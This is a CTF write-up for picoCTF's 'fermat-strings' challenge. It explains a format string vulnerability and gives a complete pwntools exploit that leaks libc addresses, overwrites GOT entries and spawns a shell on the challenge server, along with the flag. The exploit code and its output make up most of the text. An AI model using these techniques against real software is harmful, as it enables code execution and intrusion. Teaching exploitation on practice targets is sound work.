# fermat-strings
Binary Exploitation, 250 points

## Description

> Fermat's last theorem solver as a service.

A binary file was attached, together with the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>

#define SIZE 0x100

int main(void)
{
  char A[SIZE];
  char B[SIZE];

  int a = 0;
  int b = 0;

  puts("Welcome to Fermat\\'s Last Theorem as a service");

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  printf("A: ");
  read(0, A, SIZE);
  printf("B: ");
  read(0, B, SIZE);

  A[strcspn(A, "\n")] = 0;
  B[strcspn(B, "\n")] = 0;

  a = atoi(A);
  b = atoi(B);

  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }

  char buffer[SIZE];
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);

  int answer = -1;
  for(int i = 0; i < 100; i++) {
    if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
      answer = i;
    }
  }

  if(answer != -1) printf("Found the answer: %d\n", answer);
}

```

## Solution

"Fermat-strings" is a service related to [Fermat's Last Theorem](https://en.wikipedia.org/wiki/Fermat%27s_Last_Theorem), which states that:

> No three positive integers `a`, `b`, and `c` satisfy the equation `a^n + b^n = c^n` for any integer value of n greater than `2`.

It also sounds a lot like "format strings", which is the vulnerability we see in the code:

```c
snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
printf(buffer);
```


Since we control `A` and `B`, we can provide format specifiers in order to cause information leakage and memory writes.

Let's start with a naive example:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: %p
B: %p
Error: could not parse numbers!
```

This fails. The reason is that when `atoi` gets an input such as `%p`, it is unable to convert it to a number. However, let's take a closer look at how `atoi` works:

> Parses the C-string str interpreting its content as an integral number, which is returned as a value of type int.
> 
> The function first discards as many whitespace characters (as in isspace) as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many base-10 digits as possible, and interprets them as a numerical value.
> 
> The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.
> 
> If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed and zero is returned.
> 
> ([Source](https://www.cplusplus.com/reference/cstdlib/atoi/))

So, we can smuggle in any string as long as we start with some valid number, for example:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%p
B: 1_%x
Calculating for A: 1_0x400bd7 and B: 1_98d8fa14
```

Now that we know that we can trigger a format string attack, we should find the correct offset to allow the format specifier to read back a value provided by us. Essentially, we want to provide a set of addresses, and then format specifiers to dereference the addresses we've provide and read from / write to them. In a classic format string attack, both the addresses and the specifiers are provided in the format string together, and sent to `printf` as one string. However, since our addresses will contain `0x00` bytes, and since we must pass through `snprintf` in order to enable the format string vulnerability in `printf`, the naive approach won't suffice: `snprintf` will cut off anything after the first NULL byte it reaches, and the string passed to `snprintf` won't contain all of our payload. So, in our case, we will need to make sure that `printf` gets the format specifiers, but their offsets point to the original `A` or `B` which can contain as many NULL bytes as we want. In practice, we will provide the format specifiers in `A` and the addresses in `B`.

We start by running the program in the debugger, and setting a breakpoint right before the `printf`. We then provide the following input:

```
Welcome to Fermat\'s Last Theorem as a service
A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p
B: 1_ABCDEFGH
```

In `A`, we are leaking a few values to help us get oriented. In `B`, we are providing a marker to help us find the correct offset. We run and hit the breakpoint, then dump the stack:

```
gef>  stack 100
0x00007fffffffe550│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffe558│+0x0008: 0x0000000000000000
0x00007fffffffe560│+0x0010: 0x0000000000000000
0x00007fffffffe568│+0x0018: 0x0000000100000001
0x00007fffffffe570│+0x0020: "1_%p.%p.%p.%p.%p.%p.%p.%p.%p"
0x00007fffffffe578│+0x0028: "%p.%p.%p.%p.%p.%p.%p"
0x00007fffffffe580│+0x0030: ".%p.%p.%p.%p"
0x00007fffffffe588│+0x0038: 0x0000000070252e70 ("p.%p"?)
0x00007fffffffe590│+0x0040: 0x0000000000000001
0x00007fffffffe598│+0x0048: 0x0000255499f1c4be
0x00007fffffffe5a0│+0x0050: 0x0000255499eea3a8
0x00007fffffffe5a8│+0x0058: 0x00007ffff7ffe180  →  0x0000000000000000
0x00007fffffffe5b0│+0x0060: 0x00007ffff7ffe180  →  0x0000000000000000
0x00007fffffffe5b8│+0x0068: 0x00007ffff7fe96b8  →  <_dl_unload_cache+40> mov QWORD PTR [rip+0x14a45], 0x0        # 0x7ffff7ffe108 <cache>
0x00007fffffffe5c0│+0x0070: 0x00007fffffffe860  →  0x0000000000400ad0  →  <__libc_csu_init+0> push r15
0x00007fffffffe5c8│+0x0078: 0x00007ffff7fd6b1f  →  <dl_main+9791> lea rsp, [rbp-0x28]
0x00007fffffffe5d0│+0x0080: 0x0000000000000000
0x00007fffffffe5d8│+0x0088: 0x0000000000000000
0x00007fffffffe5e0│+0x0090: 0x0000000000000000
0x00007fffffffe5e8│+0x0098: 0x0000000000000000
0x00007fffffffe5f0│+0x00a0: 0x00007ffff7ca8740  →  0x00007ffff7ca8740  →  [loop detected]
0x00007fffffffe5f8│+0x00a8: 0x00007ffff7ffe080  →  0x0000000000000001
0x00007fffffffe600│+0x00b0: 0x0000000000000000
0x00007fffffffe608│+0x00b8: 0x00007fffffffea01  →  0x2400007fffffffee
0x00007fffffffe610│+0x00c0: 0x00007ffff7ffe701  →  0x2000000000000000
0x00007fffffffe618│+0x00c8: 0x00007ffff7ffd9e8  →  0x00007ffff7fd2000  →  0x00010102464c457f
0x00007fffffffe620│+0x00d0: 0x00007fffffffe648  →  0x00007ffff7fd0218  →  0x000b001200000036 ("6"?)
0x00007fffffffe628│+0x00d8: 0x0000255499eea3a8
0x00007fffffffe630│+0x00e0: 0x0000000000000000
0x00007fffffffe638│+0x00e8: 0x0000000000000000
0x00007fffffffe640│+0x00f0: 0x0000000000000000
0x00007fffffffe648│+0x00f8: 0x00007ffff7fd0218  →  0x000b001200000036 ("6"?)
0x00007fffffffe650│+0x0100: 0x0000002000000000
0x00007fffffffe658│+0x0108: 0x0000000000000000
0x00007fffffffe660│+0x0110: 0x0000000000000000
0x00007fffffffe668│+0x0118: 0x0000000000000000
0x00007fffffffe670│+0x0120: "1_ABCDEFGH"         ← $r10
0x00007fffffffe678│+0x0128: 0x0000000103004847 ("GH"?)
0x00007fffffffe680│+0x0130: 0x0000000000000000
0x00007fffffffe688│+0x0138: 0x0000000000000000
0x00007fffffffe690│+0x0140: 0x0000000000000000
0x00007fffffffe698│+0x0148: 0x0000000000000000
0x00007fffffffe6a0│+0x0150: 0x0000000000000000
0x00007fffffffe6a8│+0x0158: 0x0000000000000000
0x00007fffffffe6b0│+0x0160: 0x0000000000000000
0x00007fffffffe6b8│+0x0168: 0x0000000000000000
0x00007fffffffe6c0│+0x0170: 0x0000000000000000
0x00007fffffffe6c8│+0x0178: 0x0000000000000000
0x00007fffffffe6d0│+0x0180: 0x0000000000000000
0x00007fffffffe6d8│+0x0188: 0x0000000000000000
0x00007fffffffe6e0│+0x0190: 0x0000000000000000
0x00007fffffffe6e8│+0x0198: 0x0000000000000000
0x00007fffffffe6f0│+0x01a0: 0x0000000000000000
0x00007fffffffe6f8│+0x01a8: 0x0000000000000000
0x00007fffffffe700│+0x01b0: 0x0000000000000000
0x00007fffffffe708│+0x01b8: 0x0000000000000000
0x00007fffffffe710│+0x01c0: 0x0000000000000000
0x00007fffffffe718│+0x01c8: 0x0000000000000000
0x00007fffffffe720│+0x01d0: 0x0000000000000000
0x00007fffffffe728│+0x01d8: 0x0000000000000000
0x00007fffffffe730│+0x01e0: 0x0000000000000000
0x00007fffffffe738│+0x01e8: 0x0000000000000000
0x00007fffffffe740│+0x01f0: 0x0000000000000000
0x00007fffffffe748│+0x01f8: 0x0000000000000000
0x00007fffffffe750│+0x0200: 0x0000000000000000
0x00007fffffffe758│+0x0208: 0x0000000000000000
0x00007fffffffe760│+0x0210: 0x0000000000000000
0x00007fffffffe768│+0x0218: 0x0000000000000000
0x00007fffffffe770│+0x0220: "Calculating for A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p an[...]"    ← $rdi
0x00007fffffffe778│+0x0228: "ing for A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p and B: 1_A[...]"
0x00007fffffffe780│+0x0230: "A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p and B: 1_ABCDEFGH\[...]"
0x00007fffffffe788│+0x0238: "%p.%p.%p.%p.%p.%p.%p.%p and B: 1_ABCDEFGH\n"
0x00007fffffffe790│+0x0240: ".%p.%p.%p.%p.%p and B: 1_ABCDEFGH\n"
0x00007fffffffe798│+0x0248: "p.%p.%p and B: 1_ABCDEFGH\n"
0x00007fffffffe7a0│+0x0250: "and B: 1_ABCDEFGH\n"
0x00007fffffffe7a8│+0x0258: "_ABCDEFGH\n"
0x00007fffffffe7b0│+0x0260: 0x0000000000000a48 ("H\n"?)
0x00007fffffffe7b8│+0x0268: 0x0000000000000000
0x00007fffffffe7c0│+0x0270: 0x0000000000000000
0x00007fffffffe7c8│+0x0278: 0x0000000000000000
0x00007fffffffe7d0│+0x0280: 0x0000000000000000
0x00007fffffffe7d8│+0x0288: 0x0000000000000000
0x00007fffffffe7e0│+0x0290: 0x0000000000000000
0x00007fffffffe7e8│+0x0298: 0x0000000000000000
0x00007fffffffe7f0│+0x02a0: 0x0000000000000000
0x00007fffffffe7f8│+0x02a8: 0x0000000000000000
```

Then we continue, and check the program output:

```
Calculating for A: 1_0x400bd7.0x7fffffffe7b2.(nil).0xffffffff.0x7fffffffe3e0.(nil).(nil).(nil).0x100000001 and B: 1_ABCDEFGH
```

We can see that the leaked values converge with the dumped stack here:

```
0x00007fffffffe550│+0x0000: 0x0000000000000000
0x00007fffffffe558│+0x0008: 0x0000000000000000
0x00007fffffffe560│+0x0010: 0x0000000000000000
0x00007fffffffe568│+0x0018: 0x0000000100000001
```

So the ninth leaked value (`0x0000000100000001`) is the forth dumped stack value (`0x0000000100000001`). Now we find our marker at:

```
0x00007fffffffe670│+0x0120: "1_ABCDEFGH"
```

So we calculate: `(0x00007fffffffe670 - 0x00007fffffffe568) / 8 = 33`. We add the nine from before to get `42`. Let's see what that gives us:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%42$p
B: 1_ABCDEFGH
Calculating for A: 1_0x4645444342415f31 and B: 1_ABCDEFGH
```

Good, we were able to arrive to `4645444342415f31` which translates to `FEDCBA_1`, so we are in the area. Remember that the `1_` prefix is just there to bypass `atoi`, so to capture the full 8 bytes of the value we provide, we play a bit with the offsets and add alignment padding:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%43$p
B: 1_______ABCDEFGH
Calculating for A: 1_0x4847464544434241 and B: 1_______ABCDEFGH
```

Now we can start leaking addresses. We can use the following `pwntools` script to leak the `puts` runtime address:

```python
def send_payload(io, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    io.sendlineafter("A: ", a)
    io.sendlineafter("B: ", b)

def send_format(io, format, values):
    format_prefix = b'1___'
    values_prefix = b'1_______'
    send_payload(io, format_prefix + format, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

log.info(f"puts() GOT address: {hex(exe.got['puts'])}")

fmt_first_offset = 43

io = start()
output = send_format(io, f"%{fmt_first_offset}$s".encode("ascii"), p64(exe.got["puts"]))
puts_addr_str = output
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ python3 poc.py
[*] '/media/sf_CTFs/pico/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] puts() GOT address: 0x601018
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Sending:
    A:
    b'1___%43$s'
    B:
    00000000  31 5f 5f 5f  5f 5f 5f 5f  18 10 60 00  00 00 00 00  │1___│____│··`·│····│
    00000010
[*] Received:
    00000000  a0 d5 80 e3  0b 7f                                  │····│··│
    00000006
[*] puts() runtime address: 0x7f0be380d5a0
[*] Closed connection to mars.picoctf.net port 31929
```

Let's add another leak - the `atoi` runtime address:

```python
log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
log.info(f"atoi() GOT address: {hex(exe.got['atoi'])}")

fmt_first_offset = 43

io = start()
output = send_format(io, f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode("ascii"), p64(exe.got["puts"]) + p64(exe.got["atoi"]))
puts_addr_str, atoi_addr_str, *rest = output.split(b".")
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
log.info(f"atoi() runtime address: {hex(atoi_addr)}")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ python3 poc.py
[*] '/media/sf_CTFs/pico/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] puts() GOT address: 0x601018
[*] atoi() GOT address: 0x601058
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Sending:
    A:
    b'1___%43$s.%44$s.'
    B:
    00000000  31 5f 5f 5f  5f 5f 5f 5f  18 10 60 00  00 00 00 00  │1___│____│··`·│····│
    00000010  58 10 60 00  00 00 00 00                            │X·`·│····│
    00000018
[*] Received:
    00000000  a0 55 15 3a  50 7f 2e 30  57 11 3a 50  7f 2e        │·U·:│P·.0│W·:P│·.│
    0000000e
[*] puts() runtime address: 0x7f503a1555a0
[*] atoi() runtime address: 0x7f503a115730
[*] Closed connection to mars.picoctf.net port 31929
```

These runtime addresses give us two things. First, they help us figure out the LibC used for the challenge via [the libc database](https://github.com/niklasb/libc-database). (Note that the challenge also included a docker image which could be used for the same purpose). But more importantly, they allow us to calculate the runtime base address of LibC.

The LibC database gives us the following offsets:


|Symbol     |Offset   |Difference|
|-----------|---------|----------|
|atoi       |0x047730 |0x0       |
|system     |0x055410 |0xdce0    |
|printf     |0x064e10 |0x1d6e0   |
|snprintf   |0x064ee0 |0x1d7b0   |
|puts       |0x0875a0 |0x3fe70   |
|setbuf     |0x08ec50 |0x47520   |
|open       |0x110e50 |0xc9720   |
|read       |0x111130 |0xc9a00   |
|write      |0x1111d0 |0xc9aa0   |
|str_bin_sh |0x1b75aa |0x16fe7a  |

What's important here is the offset of `system`: Eventually we'll have to override some function pointer with `system` to pop-up a shell. To do that, we take the runtime base offset of LibC (which is the runtime offset of `puts` minus the build-time LibC offset of `puts`), add it to the build-time LibC offset of `system` and get the runtime offset of `system`.

However, in order to do that, we will first need a way to overcome the fact that our format string vulnerability is a one-shot. We can leak some runtime addresses in order to calculate the base offset of LibC, but once we do that - the program arrives to the end and we can't use this information in any way. So, what we want to do is use the same vulnerability to leak runtime offsets **and** override some function pointer with the address of `main`, so that we can reuse the vulnerability.

For that, we use the `%n` format specifier that allows us to write to a given address. Specifically, it writes to the address we provide the number of characters outputted by `printf` up to that moment, and by controlling the number of characters we print, we can write any value we want to. We will overwrite `pow` with the address of `main`:

```python
io = start()
loop_main_fmt, loop_main_address = fmtstr_split(fmt_first_offset, {exe.got["pow"]: exe.symbols["main"]}, numbwritten = 23)
send_format(io, loop_main_fmt, loop_main_address)
io.interactive()
```

`pwntools` takes care of the formatting, but notice how we needed to inform it of the number of bytes written by `printf` before arriving to the `%n`. We provided `23` to account for the string "`Calculating for A: 1___`".

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ python3 poc.py
[*] '/media/sf_CTFs/pico/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Sending:
    A:
    b'1___%2080c%43$lln%9c%44$hhn'
    B:
    00000000  31 5f 5f 5f  5f 5f 5f 5f  40 10 60 00  00 00 00 00  │1___│____│@·`·│····│
    00000010  42 10 60 00  00 00 00 00                            │B·`·│····│
    00000018
[*] Received:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000810  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
    00000820  20 20 20 20  20 20 20 20  d2                        │    │    │·│
    00000829
[*] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: $ 1
B: $ 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: $ 2
B: $ 2
Calculating for A: 2 and B: 2
Welcome to Fermat\'s Last Theorem as a service
```

As we can see, instead of performing the calculation, we keep jumping back to `main`.


At this point we have a leak allowing us to calculate the LibC base, and we have a loop allowing us to exploit the format string vulnerability again. The last part of the exploit is to overwrite some other function address with the address of `system`. We'll override `atoi`. This means that if we provide `/bin/sh` as one of the inputs, when the program calls `a = atoi(A)` it will actually be calling `system("/bin/sh")` - giving us a shell.

Putting it all together, we get:

```python
# First, generate a pwntools template with:
#  pwn template --host mars.picoctf.net --port 31929 ./chall
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def send_payload(io, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    io.sendlineafter("A: ", a)
    io.sendlineafter("B: ", b)

def send_format(io, format, values):
    format_prefix = b'111_'
    values_prefix = b'1111111_'
    send_payload(io, format_prefix + format, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")

io = start()

log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
log.info(f"atoi() GOT address: {hex(exe.got['atoi'])}")

fmt_first_offset = 43

loop_main_fmt, loop_main_address = fmtstr_split(fmt_first_offset + 2, {exe.got["pow"]: exe.symbols["main"]}, numbwritten = 0x25)
io = start()
output = send_format(io, f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode("ascii") + loop_main_fmt, p64(exe.got["puts"]) + p64(exe.got["atoi"]) + loop_main_address)
puts_addr_str, atoi_addr_str, *rest = output.split(b".")
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
log.info(f"atoi() runtime address: {hex(atoi_addr)}")


libc.address = puts_addr - libc.symbols["puts"]
assert(libc.address & 0xFFF == 0)

log.info(f"LibC base address: {hex(libc.address)}")

atoi_to_system_fmt, atoi_to_system_address = fmtstr_split(fmt_first_offset, {exe.got["atoi"]: libc.symbols["system"]}, numbwritten = 0x17)
send_format(io, atoi_to_system_fmt, atoi_to_system_address)

send_payload(io, "/bin/sh", "dummy")

io.interactive()
```

This script combines the main building blocks we saw earlier, with some minor adjustments for performing the steps together instead of discretely. The output we get is:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/pico/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/media/sf_CTFs/pico/fermat-strings/libc6_2.31-0ubuntu9.1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] puts() GOT address: 0x601018
[*] atoi() GOT address: 0x601058
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Sending:
    A:
    b'111_%43$s.%44$s.%2066c%45$lln%9c%46$hhn'
    B:
    00000000  31 31 31 31  31 31 31 5f  18 10 60 00  00 00 00 00  │1111│111_│··`·│····│
    00000010  58 10 60 00  00 00 00 00  40 10 60 00  00 00 00 00  │X·`·│····│@·`·│····│
    00000020  42 10 60 00  00 00 00 00                            │B·`·│····│
    00000028
[*] Received:
    00000000  a0 55 2d a9  c4 7f 2e 30  57 29 a9 c4  7f 2e 20 20  │·U-·│··.0│W)··│·.  │
    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000810  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
    00000820  20 20 20 20  20 20 20 20  ae                        │    │    │·│
    00000829
[*] puts() runtime address: 0x7fc4a92d55a0
[*] atoi() runtime address: 0x7fc4a9295730
[*] LibC base address: 0x7fc4a924e000
[*] Sending:
    A:
    b'111_%249c%43$lln%26c%44$hhn%10c%45$hhn%75c%46$hhn%42c%47$hhn%27c%48$hhn'
    B:
    00000000  31 31 31 31  31 31 31 5f  58 10 60 00  00 00 00 00  │1111│111_│X·`·│····│
    00000010  5a 10 60 00  00 00 00 00  59 10 60 00  00 00 00 00  │Z·`·│····│Y·`·│····│
    00000020  5d 10 60 00  00 00 00 00  5b 10 60 00  00 00 00 00  │]·`·│····│[·`·│····│
    00000030  5c 10 60 00  00 00 00 00                            │\·`·│····│
    00000038
[*] Received:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
[*] Received:
    00000000  a0 55 2d a9  c4 7f 2e 30  57 29 a9 c4  7f 2e 20 20  │·U-·│··.0│W)··│·.  │
    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000810  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
    00000820  20 20 20 20  20 20 20 20  ae                        │    │    │·│
    00000829
[*] puts() runtime address: 0x7fc4a92d55a0
[*] atoi() runtime address: 0x7fc4a9295730
[*] LibC base address: 0x7fc4a924e000
[*] Sending:
    A:
    b'111_%249c%43$lln%26c%44$hhn%10c%45$hhn%75c%46$hhn%42c%47$hhn%27c%48$hhn'
    B:
    00000000  31 31 31 31  31 31 31 5f  58 10 60 00  00 00 00 00  │1111│111_│X·`·│····│
    00000010  5a 10 60 00  00 00 00 00  59 10 60 00  00 00 00 00  │Z·`·│····│Y·`·│····│
    00000020  5d 10 60 00  00 00 00 00  5b 10 60 00  00 00 00 00  │]·`·│····│[·`·│····│
    00000030  5c 10 60 00  00 00 00 00                            │\·`·│····│
    00000038
[*] Received:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000f0  20 20 20 20  20 20 20 20  d8 20 20 20  20 20 20 20  │    │    │·   │    │
    00000100  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000110  20 20 8e 20  20 20 20 20  20 20 20 20  00 20 20 20  │  · │    │    │·   │
    00000120  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000160  20 20 20 20  20 20 20 ff  20 20 20 20  20 20 20 20  │    │   ·│    │    │
    00000170  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000190  20 90 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │ ·  │    │    │    │
    000001a0  20 20 20 20  20 20 20 20  20 20 20 20  e8           │    │    │    │·│
    000001ad
[*] Sending:
    A:
    /bin/sh
    B:
    00000000  64 75 6d 6d  79                                     │dumm│y│
    00000005
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
```

The flag: `picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}`